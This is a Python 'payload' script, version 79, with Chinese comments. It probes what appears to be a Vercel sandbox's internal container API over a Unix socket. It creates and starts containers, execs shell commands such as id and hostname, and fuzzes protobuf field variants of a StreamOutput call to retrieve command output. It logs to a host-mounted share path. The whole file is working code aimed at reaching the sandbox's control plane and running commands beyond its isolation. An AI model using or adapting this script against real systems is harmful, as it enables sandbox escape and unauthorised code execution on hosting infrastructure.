# -*- coding: utf-8 -*-
"""v79 payload: StreamOutput 字段变体矩阵 (找 stdout/stderr 标志字段) + Exec 输出拉取
v78 确认: grpc 帧 + field1=containerId + field2=processId 通过, 缺 stream 标志字段
错误 "only stdout or stderr can be requested" -> 请求含 stream 枚举/布尔字段
变体: 3=enum(0/1/2), 3=bool, 4=bool, 3=string(stdout/stderr), 4=string"""
import socket, time, os, json, struct

OUT = '/vercel/sandbox/v79c.out'


def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    for p in (OUT, '/mnt/h/volumes/run/vercel/share/v79c2.out'):
        try:
            open(p, 'a', encoding='utf-8', errors='replace').write(line + '\n')
        except Exception:
            pass
    try:
        print(line, flush=True)
    except Exception:
        pass


def pvarint(n):
    out = bytearray()
    while n > 127:
        out.append((n & 127) | 128)
        n >>= 7
    out.append(n)
    return bytes(out)


def pstr(field_no, s):
    b = s.encode() if isinstance(s, str) else s
    return pvarint((field_no << 3) | 2) + pvarint(len(b)) + b


def pbool(field_no, v):
    return pvarint((field_no << 3) | 0) + pvarint(1 if v else 0)


def grpc_frame(payload):
    return b'\x00' + struct.pack('>I', len(payload)) + payload


def rpc_raw(path, body=b'', ct='application/grpc', t=5):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect('/run/cell/cell.sock')
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n' % (path, ct, len(body)))
        s.sendall(req.encode() + body)
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', '', b''
        head, _, rest = data.partition(b'\r\n\r\n')
        lines = head.decode(errors='replace').split('\r\n')
        return lines[0], '\n'.join(lines[1:])[:200], rest
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, '', b''


def rpc(path, body='{}', t=3):
    st, hd, bd = rpc_raw(path, body.encode(), 'application/json', t)
    return st, bd[:800].decode(errors='replace')


def exec_cmd(ctr, cid, argv, t=6):
    body = json.dumps({"containerId": cid, "process": {"argv": argv}})
    return rpc(ctr + '/Exec', body, t=t)


def try_stream(ctr, cid, pa, label, payload):
    st, hd, bd = rpc_raw(ctr + '/StreamOutput', grpc_frame(payload), 'application/grpc', t=6)
    log('TRY %-26s -> %s | %s | body=%r' % (label, st, hd[:100], bd[:300]))


def main():
    log('V79 payload start pid=%d' % os.getpid())
    CTR = '/vercel.hive.cell.api.containers.v1.ContainersService'

    st, bd = rpc(CTR + '/Create', '{"drive_id":"sandbox"}')
    cid = bd.split('"containerId":"')[1].split('"')[0] if '"containerId"' in bd else None
    log('ID=%s' % (cid or 'NONE'))
    if not cid:
        log('V79C_DONE')
        return
    rpc(CTR + '/Start', '{"containerId":"%s"}' % cid, t=5)
    log('started')
    time.sleep(1)

    # Exec A: 长驻 + 输出
    st, bd = exec_cmd(CTR, cid, ['/bin/sh', '-c',
                      'echo V79_HELLO_STDOUT; echo V79_ERR_STDERR >&2; id; hostname; sleep 60'], t=6)
    PA = bd.split('"processId":"')[1].split('"')[0] if '"processId"' in bd else None
    log('execA -> %s | PA=%s' % (st, PA or bd[:150]))
    time.sleep(1)

    base = pstr(1, cid) + pstr(2, PA)
    variants = [
        ('empty', b''),
        ('cid-only', pstr(1, cid)),
        ('pa-only', pstr(2, PA)),
        ('base', base),
        ('f3-enum0', base + pvarint((3 << 3) | 0) + pvarint(0)),
        ('f3-enum1', base + pvarint((3 << 3) | 0) + pvarint(1)),
        ('f3-enum2', base + pvarint((3 << 3) | 0) + pvarint(2)),
        ('f3-bool1', base + pbool(3, True)),
        ('f3-bool0', base + pbool(3, False)),
        ('f4-bool1', base + pbool(4, True)),
        ('f3-str-stdout', base + pstr(3, 'stdout')),
        ('f3-str-stderr', base + pstr(3, 'stderr')),
        ('f4-str-stdout', base + pstr(4, 'stdout')),
        ('f4-str-stderr', base + pstr(4, 'stderr')),
        ('f3-u1+f4-u1', base + pvarint((3 << 3) | 0) + pvarint(1) + pvarint((4 << 3) | 0) + pvarint(1)),
    ]
    for label, pl in variants:
        try_stream(CTR, cid, PA, label, pl)
        time.sleep(0.4)

    # 重复 Exec + 立即 Stream (验证时序)
    st, bd = exec_cmd(CTR, cid, ['/bin/sh', '-c', 'echo SEQ2; sleep 60'], t=5)
    PB = bd.split('"processId":"')[1].split('"')[0] if '"processId"' in bd else None
    log('execB -> PA=%s' % PB)
    time.sleep(0.3)
    try_stream(CTR, cid, PB, 'after-exec f3-enum1', pstr(1, cid) + pstr(2, PB) + pvarint((3 << 3) | 0) + pvarint(1))
    time.sleep(0.4)
    try_stream(CTR, cid, PB, 'after-exec f3-str-stdout', pstr(1, cid) + pstr(2, PB) + pstr(3, 'stdout'))

    # 用 JSON 试试带 stream 字段
    for label, body in [('json-stream1', '{"containerId":"%s","processId":"%s","stream":1}' % (cid, PA)),
                        ('json-stream-so', '{"containerId":"%s","processId":"%s","stream":"stdout"}' % (cid, PA))]:
        st, hd, bd = rpc_raw(CTR + '/StreamOutput', body.encode(), 'application/json', t=5)
        log('JSON %-16s -> %s | %s | body=%r' % (label, st, hd[:100], bd[:200]))
        time.sleep(0.3)

    rpc(CTR + '/Kill', '{"containerId":"%s"}' % cid)
    log('killed')
    log('V79C_DONE')


main()
